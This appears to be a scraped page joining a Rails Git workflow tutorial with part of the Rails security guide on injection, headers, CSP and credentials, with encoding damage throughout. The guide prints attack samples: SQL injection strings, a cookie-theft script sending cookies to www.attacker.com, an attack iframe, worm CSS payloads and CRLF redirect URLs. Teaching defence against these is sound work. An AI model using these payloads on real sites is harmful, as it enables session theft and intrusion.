# See http://help.github.com/ignore-files/ for more about ignoring files.
#
# If you find yourself ignoring temporary files generated by your text editor
# or operating system, you probably want to add a global ignore instead:
# git config --global core.excludesfile &#39;~/.gitignore_global&#39;
# Ignore bundler config.
/.bundle
# Ignore the default SQLite database.
/db/*.sqlite3
/db/*.sqlite3-journal
# Ignore all logfiles and tempfiles.
/log/*.log
/tmp</code></pre>
<p>For a .gitignore file that ignores more, see an example .gitignore file from the RailsApps project. Git Workflow Your workflow with Git will move through four distinct phases as you add or edit files. Untracked Files The first phase is a âdirtyâ state of untracked and changed files, before any snapshot. The git status command lists all folders or files that are not checked into the repository.</p>
<p>Staging</p>
<p>Recording files in the Git repository takes two steps: staging and committing. There will be times when you change many files at once. For example, you may fix a bug, add a new graphic, and change a form. You might think youâd like to have Git automatically record all the changes as you save each file. But the story of your project would be confusing and overly detailed. Git requires you to mark one or more files (âstagingâ) before recording the changes (âcommittingâ). This gives you fine-grained control over the recorded history of your project. You can mark individual files to be staged:</p>
<pre class="r"><code>$ git add Gemfile</code></pre>
<p>Adding individual files allows you to selectively record the history of your project. For example, you might stage and commit a series of bug fixes before you stage and commit new features. Applying the time traveler analogy, it will be easier to travel back to look at bug fixes if they are not mixed in with new features.</p>
<p>More often, youâll mark all the files to be staged. Do so now: $ git add -A Running git status will show you a long list of files that are staged and ready to commit. There are three forms of the git add command: â¢ git add foo.txt adds a file named foo.txt â¢ git add . adds all new files and changed files, except deleted files â¢ git add -A adds everything, including deletions If it seems nonsensical that the command git add -A âadds deletions,â donât worry. Like time travel, Git will stretch your understanding of what makes sense. Most often, you can simply use the git add -A form of the command. Committing Staging gives you an opportunity to organize your changes in groups before you commit. If youâve only worked on one feature, youâll likely stage and commit everything at once. When you âmake a commitâ, you include a message that describes the work youâve done. For a time traveler, the âcommit messageâ is important; you are leaving a trail to help you find your way into the past. Google will show you dozens of blog posts about âwriting better commit messagesâ but common sense can be your guide. Writing âfix registration form to catch blank email addressesâ will be more helpful than merely writing âfix bugs.â And if you wonder why commit messages are commonly written in the imperative not past tense (âfixâ not âfixedâ), itâs a time traveler convention. Now commit your project to the repository: $ git commit -m âInitial commitâ The -m flag lets you add a message for the commit. The pristine state of your new Rails application is now recorded in the repo. Running git status will tell you ânothing to commit (working directory clean).â Git Log You can use the git log command to see your project history: 57 $ git log If you get âstuckâ in git log , type q to return to the command prompt. I like to use the git log command with an option for a compact listing: $ git log âoneline The listing is easier to review when it is displayed in a compact format. Pushing to GitHub Weâve seen three phases of the Git workflow: untracked, staged, and committed. A fourth stage is important when you work with others: pushing to GitHub. Itâs also important when you access your project from more than one computer or you want an offsite backup of your work. The repositories hosted on your GitHub account establish your reputation as a Rails developer for employers and developers you may work with. Even if your first project is copied from a tutorial, it shows you are serious about learning Rails and studying conscientiously. Did you create a GitHub account? Now would be a good time to add your repo to GitHub. Go to GitHub and create a new empty repository for your project. Name the repository âlearn-railsâ and give it a description. If the repository is public, hosting on GitHub is free. Donât be reluctant to go public with an unfinished or half-baked project; everyone expects projects on GitHub to be works in progress. Add GitHub as a remote repository for your project and push your local project to GitHub. Before you copy and paste the command, notice that you need to insert your own GitHub account name: $ git remote add origin <a href="https://github.com/YOUR_GITHUB_ACCOUNT/learn-rails.git" class="uri">https://github.com/YOUR_GITHUB_ACCOUNT/learn-rails.git</a> $ git push -u origin master The -u option sets up Git so you can use git push in the future without explicitly specifying GitHub as the destination. Now you can view your project repository on GitHub at: â¢ <a href="https://github.com/YOUR_GITHUB_ACCOUNT/learn-rails" class="uri">https://github.com/YOUR_GITHUB_ACCOUNT/learn-rails</a> 58 Take a look. Itâs an exact copy of the project on your local computer. If you havenât used GitHub before, take some time to explore. GitHub is absolutely essential to all open source Rails development. You may notice that the README.rdoc file is automatically incorporated into the home page of the project repository on GitHub. For our next step, weâll update the README file, commit it to the local repo, and push it up to GitHub. The README Changing the README file is a good way to practice with Git. Itâs also a good habit to edit the README file whenever you create a new project. Itâs easy to neglect the README for little projects that youâve just started. But replacing a default README file shows you are a disciplined, conscientious developer who will be a good collaborator. The new README file can be brief. Just state your intentions and acknowledge any code youâve borrowed. For this project you could say, âExcited to learn Rails with help from the RailsApps project!â In your text editor, open the file README.rdoc and replace the contents: Learning Rails == Learning Rails with a tutorial from the RailsApps project. GitHub lets you add formatting using your choice of markup syntax, depending on the file extension you add to the filename: â¢ README.rdoc uses the rdoc syntax â¢ README.md uses the GitHub Flavored Markdown syntax â¢ README.textile uses the Textile syntax Weâll use Markdown syntax by adding the == characters after the first line of text to force a headline. Thereâs no requirement that you use Markdown syntax in your README file. Markdown is a popular way to add formatting to improve readability. For us, changing the file to Markdown creates a practical exercise in using Git. Weâll use the git mv command to rename the file to README.md and save it. $ git mv README.rdoc README.md 59 Use git status to see what has changed: $ git status # On branch master # Changes to be committed: # (use âgit reset HEAD <file>â¦â to unstage) # # renamed: README.rdoc -&gt; README.md # You could also use the Unix mv command to rename the file. If you do so, git status will show the README.rdoc file has been deleted and a new, untracked README.md file has been created. Hereâs our typical workflow. Weâll stage, commit, and push the change to GitHub: $ git add -A $ git commit -m âupdate READMEâ $ git push origin master Take a look at your GitHub repository (refresh the web page). Very cool! The README file has been updated. The git log command will display your project history: $ git log âoneline You can read more about Git and Rails if you need more information about working with Git and GitHub for code source control. Now that youâre comfortable with Git, we can begin customizing our new Rails application.</p>
<p>7 Injection Injection is a class of attacks that introduce malicious code or parameters into a web application in order to run it within its security context. Prominent examples of injection are cross-site scripting (XSS) and SQL injection.</p>
<p>Injection is very tricky, because the same code or parameter can be malicious in one context, but totally harmless in another. A context can be a scripting, query or programming language, the shell or a Ruby/Rails method. The following sections will cover all important contexts where injection attacks may happen. The first section, however, covers an architectural decision in connection with Injection.</p>
<p>7.1 Whitelists versus Blacklists When sanitizing, protecting or verifying something, prefer whitelists over blacklists.</p>
<p>A blacklist can be a list of bad e-mail addresses, non-public actions or bad HTML tags. This is opposed to a whitelist which lists the good e-mail addresses, public actions, good HTML tags and so on. Although sometimes it is not possible to create a whitelist (in a SPAM filter, for example), prefer to use whitelist approaches:</p>
Use before_action except: [â¦] instead of only: [â¦] for security-related actions. This way you donât forget to enable security checks for newly added actions. Allow <strong> instead of removing
<script> against Cross-Site Scripting (XSS). See below for details.
Don't try to correct user input by blacklists:
This will make the attack work: "<sc<script>ript>".gsub("<script>", "")
But reject malformed input
Whitelists are also a good approach against the human factor of forgetting something in the blacklist.

7.2 SQL Injection
Thanks to clever methods, this is hardly a problem in most Rails applications. However, this is a very devastating and common attack in web applications, so it is important to understand the problem.

7.2.1 Introduction
SQL injection attacks aim at influencing database queries by manipulating web application parameters. A popular goal of SQL injection attacks is to bypass authorization. Another goal is to carry out data manipulation or reading arbitrary data. Here is an example of how not to use user input data in a query:

Project.where("name = '#{params[:name]}'")
This could be in a search action and the user may enter a project's name that they want to find. If a malicious user enters ' OR 1 --, the resulting SQL query will be:

SELECT * FROM projects WHERE name = '' OR 1 --'
The two dashes start a comment ignoring everything after it. So the query returns all records from the projects table including those blind to the user. This is because the condition is true for all records.

7.2.2 Bypassing Authorization
Usually a web application includes access control. The user enters their login credentials and the web application tries to find the matching record in the users table. The application grants access when it finds a record. However, an attacker may possibly bypass this check with SQL injection. The following shows a typical database query in Rails to find the first record in the users table which matches the login credentials parameters supplied by the user.

User.find_by("login = '#{params[:name]}' AND password = '#{params[:password]}'")
If an attacker enters ' OR '1'='1 as the name, and ' OR '2'>'1 as the password, the resulting SQL query will be:

SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
This will simply find the first record in the database, and grants access to this user.

7.2.3 Unauthorized Reading
The UNION statement connects two SQL queries and returns the data in one set. An attacker can use it to read arbitrary data from the database. Let's take the example from above:

Project.where("name = '#{params[:name]}'")
And now let's inject another query using the UNION statement:

') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
This will result in the following SQL query:

SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
The result won't be a list of projects (because there is no project with an empty name), but a list of user names and their password. So hopefully you encrypted the passwords in the database! The only problem for the attacker is, that the number of columns has to be the same in both queries. That's why the second query includes a list of ones (1), which will be always the value 1, in order to match the number of columns in the first query.

Also, the second query renames some columns with the AS statement so that the web application displays the values from the user table. Be sure to update your Rails to at least 2.1.1.

7.2.4 Countermeasures
Ruby on Rails has a built-in filter for special SQL characters, which will escape ' , " , NULL character and line breaks. Using Model.find(id) or Model.find_by_some thing(something) automatically applies this countermeasure. But in SQL fragments, especially in conditions fragments (where("...")), the connection.execute() or Model.find_by_sql() methods, it has to be applied manually.

Instead of passing a string to the conditions option, you can pass an array to sanitize tainted strings like this:

Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
As you can see, the first part of the array is an SQL fragment with question marks. The sanitized versions of the variables in the second part of the array replace the question marks. Or you can pass a hash for the same result:

Model.where(login: entered_user_name, password: entered_password).first
The array or hash form is only available in model instances. You can try sanitize_sql() elsewhere. Make it a habit to think about the security consequences when using an external string in SQL.

7.3 Cross-Site Scripting (XSS)
The most widespread, and one of the most devastating security vulnerabilities in web applications is XSS. This malicious attack injects client-side executable code. Rails provides helper methods to fend these attacks off.

7.3.1 Entry Points
An entry point is a vulnerable URL and its parameters where an attacker can start an attack.

The most common entry points are message posts, user comments, and guest books, but project titles, document names and search result pages have also been vulnerable - just about everywhere where the user can input data. But the input does not necessarily have to come from input boxes on web sites, it can be in any URL parameter - obvious, hidden or internal. Remember that the user may intercept any traffic. Applications or client-site proxies make it easy to change requests. There are also other attack vectors like banner advertisements.

XSS attacks work like this: An attacker injects some code, the web application saves it and displays it on a page, later presented to a victim. Most XSS examples simply display an alert box, but it is more powerful than that. XSS can steal the cookie, hijack the session, redirect the victim to a fake website, display advertisements for the benefit of the attacker, change elements on the web site to get confidential information or install malicious software through security holes in the web browser.

During the second half of 2007, there were 88 vulnerabilities reported in Mozilla browsers, 22 in Safari, 18 in IE, and 12 in Opera. The Symantec Global Internet Security threat report also documented 239 browser plug-in vulnerabilities in the last six months of 2007. Mpack is a very active and up-to-date attack framework which exploits these vulnerabilities. For criminal hackers, it is very attractive to exploit an SQL-Injection vulnerability in a web application framework and insert malicious code in every textual table column. In April 2008 more than 510,000 sites were hacked like this, among them the British government, United Nations, and many more high profile targets.

7.3.2 HTML/JavaScript Injection
The most common XSS language is of course the most popular client-side scripting language JavaScript, often in combination with HTML. Escaping user input is essential.

Here is the most straightforward test to check for XSS:

<script>alert('Hello');</script>
<p>This JavaScript code will simply display an alert box. The next examples do exactly the same, only in very uncommon places:</p>
<img src=javascript:alert('Hello')>
<table background="javascript:alert('Hello')">
<p>7.3.2.1 Cookie Theft These examples donât do any harm so far, so letâs see how an attacker can steal the userâs cookie (and thus hijack the userâs session). In JavaScript you can use the document.cookie property to read and write the documentâs cookie. JavaScript enforces the same origin policy, that means a script from one domain cannot access cookies of another domain. The document.cookie property holds the cookie of the originating web server. However, you can read and write this property, if you embed the code directly in the HTML document (as it happens with XSS). Inject this anywhere in your web application to see your own cookie on the result page:</p>
<script>document.write(document.cookie);</script>
<p>For an attacker, of course, this is not useful, as the victim will see their own cookie. The next example will try to load an image from the URL <a href="http://www.attacker.com/" class="uri">http://www.attacker.com/</a> plus the cookie. Of course this URL does not exist, so the browser displays nothing. But the attacker can review their web serverâs access log files to see the victimâs cookie.</p>
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
<p>The log files on www.attacker.com will read like this:</p>
<p>GET <a href="http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2" class="uri">http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2</a> You can mitigate these attacks (in the obvious way) by adding the httpOnly flag to cookies, so that document.cookie may not be read by JavaScript. HTTP only cookies can be used from IE v6.SP1, Firefox v2.0.0.5, Opera 9.5, Safari 4 and Chrome 1.0.154 onwards. But other, older browsers (such as WebTV and IE 5.5 on Mac) can actually cause the page to fail to load. Be warned that cookies will still be visible using Ajax, though.</p>
<p>7.3.2.2 Defacement With web page defacement an attacker can do a lot of things, for example, present false information or lure the victim on the attackers web site to steal the cookie, login credentials or other sensitive data. The most popular way is to include code from external sources by iframes:</p>
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width="5" height="5" style="display:none">
</iframe>
<p>This loads arbitrary HTML and/or JavaScript from an external source and embeds it as part of the site. This iframe is taken from an actual attack on legitimate Italian sites using the Mpack attack framework. Mpack tries to install malicious software through security holes in the web browser - very successfully, 50% of the attacks succeed.</p>
<p>A more specialized attack could overlap the entire web site or display a login form, which looks the same as the siteâs original, but transmits the user name and password to the attackerâs site. Or it could use CSS and/or JavaScript to hide a legitimate link in the web application, and display another one at its place which redirects to a fake web site.</p>
<p>Reflected injection attacks are those where the payload is not stored to present it to the victim later on, but included in the URL. Especially search forms fail to escape the search string. The following link presented a page which stated that âGeorge Bush appointed a 9 year old boy to be the chairpersonâ¦â:</p>
<a href="http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1--" class="uri">http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1--</a>&gt;
<script src=http://www.securitylab.ru/test/sc.js></script>
<p>&lt;!â</p>
<pre class="r"><code>7.3.2.3 Countermeasures
It is very important to filter malicious input, but it is also important to escape the output of the web application.

Especially for XSS, it is important to do whitelist input filtering instead of blacklist. Whitelist filtering states the values allowed as opposed to the values not allowed. Blacklists are never complete.

Imagine a blacklist deletes &quot;script&quot; from the user input. Now the attacker injects &quot;&lt;scrscriptipt&gt;&quot;, and after the filter, &quot;&lt;script&gt;&quot; remains. Earlier versions of Rails used a blacklist approach for the strip_tags(), strip_links() and sanitize() method. So this kind of injection was possible:

strip_tags(&quot;some&lt;&lt;b&gt;script&gt;alert(&#39;hello&#39;)&lt;&lt;/b&gt;/script&gt;&quot;)
This returned &quot;some&lt;script&gt;alert(&#39;hello&#39;)&lt;/script&gt;&quot;, which makes an attack work. That&#39;s why a whitelist approach is better, using the updated Rails 2 method sanitize():

tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
This allows only the given tags and does a good job, even against all kinds of tricks and malformed tags.

As a second step, it is good practice to escape all output of the application, especially when re-displaying user input, which hasn&#39;t been input-filtered (as in the search form example earlier on). Use escapeHTML() (or its alias h()) method to replace the HTML input characters &amp;, &quot;, &lt;, and &gt; by their uninterpreted representations in HTML (&amp;amp;, &amp;quot;, &amp;lt;, and &amp;gt;).

7.3.2.4 Obfuscation and Encoding Injection
Network traffic is mostly based on the limited Western alphabet, so new character encodings, such as Unicode, emerged, to transmit characters in other languages. But, this is also a threat to web applications, as malicious code can be hidden in different encodings that the web browser might be able to process, but the web application might not. Here is an attack vector in UTF-8 encoding:

&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;
  &amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
This example pops up a message box. It will be recognized by the above sanitize() filter, though. A great tool to obfuscate and encode strings, and thus &quot;get to know your enemy&quot;, is the Hackvertor. Rails&#39; sanitize() method does a good job to fend off encoding attacks.

7.3.3 Examples from the Underground
In order to understand today&#39;s attacks on web applications, it&#39;s best to take a look at some real-world attack vectors.

The following is an excerpt from the Js.Yamanner@m Yahoo! Mail worm. It appeared on June 11, 2006 and was the first webmail interface worm:

&lt;img src=&#39;http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif&#39;
  target=&quot;&quot;onload=&quot;var http_request = false;    var Email = &#39;&#39;;
  var IDList = &#39;&#39;;   var CRumb = &#39;&#39;;   function makeRequest(url, Func, Method,Param) { ...
The worms exploit a hole in Yahoo&#39;s HTML/JavaScript filter, which usually filters all targets and onload attributes from tags (because there can be JavaScript). The filter is applied only once, however, so the onload attribute with the worm code stays in place. This is a good example why blacklist filters are never complete and why it is hard to allow HTML/JavaScript in a web application.

Another proof-of-concept webmail worm is Nduja, a cross-domain worm for four Italian webmail services. Find more details on Rosario Valotta&#39;s paper. Both webmail worms have the goal to harvest email addresses, something a criminal hacker could make money with.

In December 2006, 34,000 actual user names and passwords were stolen in a MySpace phishing attack. The idea of the attack was to create a profile page named &quot;login_home_index_html&quot;, so the URL looked very convincing. Specially-crafted HTML and CSS was used to hide the genuine MySpace content from the page and instead display its own login form.

7.4 CSS Injection
CSS Injection is actually JavaScript injection, because some browsers (IE, some versions of Safari and others) allow JavaScript in CSS. Think twice about allowing custom CSS in your web application.

CSS Injection is explained best by the well-known MySpace Samy worm. This worm automatically sent a friend request to Samy (the attacker) simply by visiting his profile. Within several hours he had over 1 million friend requests, which created so much traffic that MySpace went offline. The following is a technical explanation of that worm.

MySpace blocked many tags, but allowed CSS. So the worm&#39;s author put JavaScript into CSS like this:

&lt;div style=&quot;background:url(&#39;javascript:alert(1)&#39;)&quot;&gt;
So the payload is in the style attribute. But there are no quotes allowed in the payload, because single and double quotes have already been used. But JavaScript has a handy eval() function which executes any string as code.

&lt;div id=&quot;mycode&quot; expr=&quot;alert(&#39;hah!&#39;)&quot; style=&quot;background:url(&#39;javascript:eval(document.all.mycode.expr)&#39;)&quot;&gt;
The eval() function is a nightmare for blacklist input filters, as it allows the style attribute to hide the word &quot;innerHTML&quot;:

alert(eval(&#39;document.body.inne&#39; + &#39;rHTML&#39;));
The next problem was MySpace filtering the word &quot;javascript&quot;, so the author used &quot;java&lt;NEWLINE&gt;script&quot; to get around this:

&lt;div id=&quot;mycode&quot; expr=&quot;alert(&#39;hah!&#39;)&quot; style=&quot;background:url(&#39;javaâµ(script:eval(document.all.mycode.expr)&#39;)&quot;&gt;
Another problem for the worm&#39;s author was the CSRF security tokens. Without them he couldn&#39;t send a friend request over POST. He got around it by sending a GET to the page right before adding a user and parsing the result for the CSRF token.

In the end, he got a 4 KB worm, which he injected into his profile page.

The moz-binding CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).

7.4.1 Countermeasures
This example, again, showed that a blacklist filter is never complete. However, as custom CSS in web applications is a quite rare feature, it may be hard to find a good whitelist CSS filter. If you want to allow custom colors or images, you can allow the user to choose them and build the CSS in the web application. Use Rails&#39; sanitize() method as a model for a whitelist CSS filter, if you really need one.

7.5 Textile Injection
If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. RedCloth is such a language for Ruby, but without precautions, it is also vulnerable to XSS.

For example, RedCloth translates _test_ to &lt;em&gt;test&lt;em&gt;, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to XSS. Get the all-new version 4 that removed serious bugs. However, even that version has some security bugs, so the countermeasures still apply. Here is an example for version 3.0.4:

RedCloth.new(&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;).to_html
# =&gt; &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;
Use the :filter_html option to remove HTML which was not created by the Textile processor.

RedCloth.new(&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;, [:filter_html]).to_html
# =&gt; &quot;alert(1)&quot;
However, this does not filter all HTML, a few tags will be left (by design), for example &lt;a&gt;:

RedCloth.new(&quot;&lt;a href=&#39;javascript:alert(1)&#39;&gt;hello&lt;/a&gt;&quot;, [:filter_html]).to_html
# =&gt; &quot;&lt;p&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;hello&lt;/a&gt;&lt;/p&gt;&quot;
7.5.1 Countermeasures
It is recommended to use RedCloth in combination with a whitelist input filter, as described in the countermeasures against XSS section.

7.6 Ajax Injection
The same security precautions have to be taken for Ajax actions as for &quot;normal&quot; ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn&#39;t render a view.

If you use the in_place_editor plugin, or actions that return a string, rather than rendering a view, you have to escape the return value in the action. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.

7.7 Command Line Injection
Use user-supplied command line parameters with caution.

If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and command. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).

A countermeasure is to use the system(command, parameters) method which passes command line parameters safely.

system(&quot;/bin/echo&quot;,&quot;hello; rm *&quot;)
# prints &quot;hello; rm *&quot; and does not delete files
7.8 Header Injection
HTTP headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, XSS or HTTP response splitting.

HTTP request headers have a Referer, User-Agent (client software), and Cookie field, among others. Response headers for example have a status code, Cookie and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. Remember to escape these header fields, too. For example when you display the user agent in an administration area.

Besides that, it is important to know what you are doing when building response headers partly based on user input. For example you want to redirect the user back to a specific page. To do that you introduced a &quot;referer&quot; field in a form to redirect to the given address:

redirect_to params[:referer]
What happens is that Rails puts the string into the Location header field and sends a 302 (redirect) status to the browser. The first thing a malicious user would do, is this:

http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:

http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
Note that &quot;%0d%0a&quot; is URL-encoded for &quot;\r\n&quot; which is a carriage-return and line-feed (CRLF) in Ruby. So the resulting HTTP header for the second example will be the following because the second Location header field overwrites the first.

HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
So attack vectors for Header Injection are based on the injection of CRLF characters in a header field. And what could an attacker do with a false redirection? They could redirect to a phishing site that looks the same as yours, but ask to login again (and sends the login credentials to the attacker). Or they could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the redirect_to method. Make sure you do it yourself when you build other header fields with user input.

7.8.1 Response Splitting
If Header Injection was possible, Response Splitting might be, too. In HTTP, the header block is followed by two CRLFs and the actual data (usually HTML). The idea of Response Splitting is to inject two CRLFs into a header field, followed by another response with malicious HTML. The response will be:

HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location:(Content-Type: text/html
 
 
HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html
 
 
&amp;lt;html&amp;gt;&amp;lt;font color=red&amp;gt;hey&amp;lt;/font&amp;gt;&amp;lt;/html&amp;gt; [Arbitrary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
Under certain circumstances this would present the malicious HTML to the victim. However, this only seems to work with Keep-Alive connections (and many browsers are using one-time connections). But you can&#39;t rely on this. In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks.

8 Unsafe Query Generation
Due to the way Active Record interprets parameters in combination with the way that Rack parses query parameters it was possible to issue unexpected database queries with IS NULL where clauses. As a response to that security issue (CVE-2012-2660, CVE-2012-2694 and CVE-2013-0155) deep_munge method was introduced as a solution to keep Rails secure by default.

Example of vulnerable code that could be used by attacker, if deep_munge wasn&#39;t performed is:

unless params[:token].nil?
  user = User.find_by_token(params[:token])
  user.reset_password!
end
When params[:token] is one of: [nil], [nil, nil, ...] or [&#39;foo&#39;, nil] it will bypass the test for nil, but IS NULL or IN (&#39;foo&#39;, NULL) where clauses still will be added to the SQL query.

To keep Rails secure by default, deep_munge replaces some of the values with nil. Below table shows what the parameters look like based on JSON sent in request:

JSON    Parameters
{ &quot;person&quot;: null }  { :person =&gt; nil }
{ &quot;person&quot;: [] }    { :person =&gt; [] }
{ &quot;person&quot;: [null] }    { :person =&gt; [] }
{ &quot;person&quot;: [null, null, ...] } { :person =&gt; [] }
{ &quot;person&quot;: [&quot;foo&quot;, null] } { :person =&gt; [&quot;foo&quot;] }
It is possible to return to old behavior and disable deep_munge configuring your application if you are aware of the risk and know how to handle it:

config.action_dispatch.perform_deep_munge = false
9 Default Headers
Every HTTP response from your Rails application receives the following default security headers.

config.action_dispatch.default_headers = {
  &#39;X-Frame-Options&#39; =&gt; &#39;SAMEORIGIN&#39;,
  &#39;X-XSS-Protection&#39; =&gt; &#39;1; mode=block&#39;,
  &#39;X-Content-Type-Options&#39; =&gt; &#39;nosniff&#39;,
  &#39;X-Download-Options&#39; =&gt; &#39;noopen&#39;,
  &#39;X-Permitted-Cross-Domain-Policies&#39; =&gt; &#39;none&#39;,
  &#39;Referrer-Policy&#39; =&gt; &#39;strict-origin-when-cross-origin&#39;
}
You can configure default headers in config/application.rb.

config.action_dispatch.default_headers = {
  &#39;Header-Name&#39; =&gt; &#39;Header-Value&#39;,
  &#39;X-Frame-Options&#39; =&gt; &#39;DENY&#39;
}
Or you can remove them.

config.action_dispatch.default_headers.clear
Here is a list of common headers:

X-Frame-Options: &#39;SAMEORIGIN&#39; in Rails by default - allow framing on same domain. Set it to &#39;DENY&#39; to deny framing at all or &#39;ALLOWALL&#39; if you want to allow framing for all website.
X-XSS-Protection: &#39;1; mode=block&#39; in Rails by default - use XSS Auditor and block page if XSS attack is detected. Set it to &#39;0;&#39; if you want to switch XSS Auditor off(useful if response contents scripts from request parameters)
X-Content-Type-Options: &#39;nosniff&#39; in Rails by default - stops the browser from guessing the MIME type of a file.
X-Content-Security-Policy: A powerful mechanism for controlling which sites certain content types can be loaded from
Access-Control-Allow-Origin: Used to control which sites are allowed to bypass same origin policies and send cross-origin requests.
Strict-Transport-Security: Used to control if the browser is allowed to only access a site over a secure connection
9.1 Content Security Policy
Rails provides a DSL that allows you to configure a Content Security Policy for your application. You can configure a global default policy and then override it on a per-resource basis and even use lambdas to inject per-request values into the header such as account subdomains in a multi-tenant application.

Example global policy:

# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.default_src :self, :https
  policy.font_src    :self, :https, :data
  policy.img_src     :self, :https, :data
  policy.object_src  :none
  policy.script_src  :self, :https
  policy.style_src   :self, :https
 
  # Specify URI for violation reports
  policy.report_uri &quot;/csp-violation-report-endpoint&quot;
end
Example controller overrides:

# Override policy inline
class PostsController &lt; ApplicationController
  content_security_policy do |p|
    p.upgrade_insecure_requests true
  end
end
 
# Using literal values
class PostsController &lt; ApplicationController
  content_security_policy do |p|
    p.base_uri &quot;https://www.example.com&quot;
  end
end
 
# Using mixed static and dynamic values
class PostsController &lt; ApplicationController
  content_security_policy do |p|
    p.base_uri :self, -&gt; { &quot;https://#{current_user.domain}.example.com&quot; }
  end
end
 
# Disabling the global CSP
class LegacyPagesController &lt; ApplicationController
  content_security_policy false, only: :index
end
Use the content_security_policy_report_only configuration attribute to set Content-Security-Policy-Report-Only in order to report only content violations for migrating legacy content

# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy_report_only = true
# Controller override
class PostsController &lt; ApplicationController
  content_security_policy_report_only only: :index
end
You can enable automatic nonce generation:

# config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.script_src :self, :https
end
 
Rails.application.config.content_security_policy_nonce_generator = -&gt; request { SecureRandom.base64(16) }
Then you can add an automatic nonce value by passing nonce: true as part of html_options. Example:

&lt;%= javascript_tag nonce: true do -%&gt;
  alert(&#39;Hello, World!&#39;);
&lt;% end -%&gt;
The same works with javascript_include_tag:

&lt;%= javascript_include_tag &quot;script&quot;, nonce: true %&gt;
Use csp_meta_tag helper to create a meta tag &quot;csp-nonce&quot; with the per-session nonce value for allowing inline &lt;script&gt; tags.

&lt;head&gt;
  &lt;%= csp_meta_tag %&gt;
&lt;/head&gt;
This is used by the Rails UJS helper to create dynamically loaded inline &lt;script&gt; elements.

10 Environmental Security
It is beyond the scope of this guide to inform you on how to secure your application code and environments. However, please secure your database configuration, e.g. config/database.yml, and your server-side secret, e.g. stored in config/secrets.yml. You may want to further restrict access, using environment-specific versions of these files and any others that may contain sensitive information.

10.1 Custom credentials
Rails generates a config/credentials.yml.enc to store third-party credentials within the repo. This is only viable because Rails encrypts the file with a master key that&#39;s generated into a version control ignored config/master.key â Rails will also look for that key in ENV[&quot;RAILS_MASTER_KEY&quot;]. Rails also requires the key to boot in production, so the credentials can be read.

To edit stored credentials use bin/rails credentials:edit.

By default, this file contains the application&#39;s secret_key_base, but it could also be used to store other credentials such as access keys for external APIs.

The credentials added to this file are accessible via Rails.application.credentials. For example, with the following decrypted config/credentials.yml.enc:

secret_key_base: 3b7cd727ee24e8444053437c36cc66c3
some_api_key: SOMEKEY
Rails.application.credentials.some_api_key returns SOMEKEY in any environment.

If you want an exception to be raised when some key is blank, use the bang version:

Rails.application.credentials.some_api_key! # =&gt; raises KeyError: :some_api_key is blank
